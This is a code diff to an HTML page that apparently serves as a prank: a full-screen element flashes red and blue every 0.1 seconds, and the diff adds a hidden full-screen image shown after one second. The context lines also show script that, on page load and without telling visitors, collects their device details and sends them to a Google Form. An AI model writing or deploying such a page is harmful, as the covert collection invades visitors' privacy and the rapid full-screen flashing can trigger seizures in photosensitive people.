@@ -14,6 +14,7 @@
             height: 100vh;
             animation: flicker 0.1s infinite;
             position: absolute;
+            z-index: 1; /* Ensure the flicker is on top */
         }
         /* Screen flicker effect */
         @keyframes flicker {
@@ -24,10 +25,22 @@
             80% { background-color: red; }
             100% { background-color: blue; }
         }
+        .image {
+            display: none; /* Initially hidden */
+            width: 100vw;
+            height: 100vh;
+            background-color: white; /* Match the background of the image */
+            position: absolute;
+            z-index: 2; /* Ensure the image is above the flicker */
+            background-image: url('YOUR_IMAGE_URL'); /* Replace with your image URL */
+            background-size: cover; /* Ensure the image covers the entire screen */
+            background-repeat: no-repeat; /* Prevent image repetition */
+        }
     </style>
 </head>
 <body>
     <div class="flicker"></div>
+    <div class="image"></div> <!-- Image div -->
 
     <script>
         // Device Type
@@ -176,9 +189,18 @@
             sendToGoogleForm(details);
         }
 
+        // Function to end the flickering effect and show the image
+        function showImageAfterFlicker() {
+            const flickerDiv = document.querySelector('.flicker');
+            const imageDiv = document.querySelector('.image');
+            flickerDiv.style.display = 'none'; // Hide the flicker effect
+            imageDiv.style.display = 'block'; // Show the image
+        }
+
         // Automatically fetch and send details on page load
         window.onload = function() {
             fetchAndSendDeviceDetails();
+            setTimeout(showImageAfterFlicker, 1000); // Adjust time to match flicker duration
         };
     </script>
 </body>
